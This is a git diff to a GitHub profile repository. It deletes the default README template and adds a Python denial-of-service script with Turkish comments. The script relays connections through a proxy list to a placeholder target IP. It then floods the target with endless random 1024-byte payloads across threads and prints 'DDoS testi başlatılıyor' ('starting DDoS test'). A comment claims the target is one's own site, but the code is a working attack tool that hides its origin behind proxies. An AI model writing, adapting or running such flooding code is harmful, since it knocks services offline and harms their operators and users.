@@ -1,10 +1,46 @@
-- 👋 Hi, I’m @TheHacker-Kali
-- 👀 I’m interested in ...
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
-You have to learn the truth before you experience the bitter truth so that it doesn't hurt.
-<!---
-TheHacker-Kali/TheHacker-Kali is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+import socket
+import random
+import threading
+
+# Hedef bilgileri
+target_ip = "HEDEF_IP"  # Kendi sitenizin IP adresi
+target_port = 80        # Hedef port (örneğin, HTTP için 80)
+proxy_list = ["PROXY_IP:PORT", "PROXY_IP:PORT"]  # Kullanılacak proxy listesi
+
+# Rastgele veri oluştur
+def get_random_data(size):
+    return random._urandom(size)
+
+# Saldırı fonksiyonu
+def attack(proxy):
+    proxy_ip, proxy_port = proxy.split(":")
+    proxy_port = int(proxy_port)
+    
+    # Proxy üzerinden bağlantı
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((proxy_ip, proxy_port))
+    sock.sendall(f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\n\r\n".encode())
+    
+    # Saldırı başlat
+    while True:
+        try:
+            data = get_random_data(1024)  # 1024 byte veri gönder
+            sock.sendto(data, (target_ip, target_port))
+        except Exception as e:
+            print(f"Proxy {proxy} ile bağlantı kesildi: {e}")
+            break
+
+# Thread başlatıcı
+def start_attack():
+    threads = []
+    for proxy in proxy_list:
+        thread = threading.Thread(target=attack, args=(proxy,))
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
+if __name__ == "__main__":
+    print("DDoS testi başlatılıyor...")
+    start_attack()
